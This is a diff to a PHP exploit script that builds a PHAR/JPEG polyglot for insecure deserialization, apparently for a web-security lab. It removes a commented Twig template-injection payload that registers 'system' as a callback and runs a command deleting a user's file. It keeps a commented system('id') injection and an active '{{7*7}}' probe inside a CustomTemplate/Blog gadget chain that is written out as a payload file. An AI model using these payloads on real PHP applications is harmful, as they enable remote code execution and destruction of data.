@@ -100,14 +100,9 @@ function generate_polyglot($phar, $jpeg){
 // $object = new PHPObjectInjection;
 // $object->inject = 'system("id");';
 // $object->out = 'Hallo World';
-// $blog = new Blog("abc","{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('rm /home/carlos/morale.txt')}}");
 
-// $object = new CustomTemplate($blog);
-$blog = new Blog("abc","abc");
-$blog->desc = "{{7*7}}";
-$blog->user = 'user';
-$object = new CustomTemplate($blog);
-// $object->template_file_path = $blog;
+$object = new CustomTemplate(new Blog("abc","{{7*7}}Hello"));
+
 // config for jpg
 $tempname = 'temp.tar.phar'; // make it tar
 $jpeg = file_get_contents('in.jpg');
@@ -131,4 +126,3 @@ $outfile = 'out.gif';
 file_put_contents($outfile, generate_base_phar($payload, $prefix));
 
 */
-
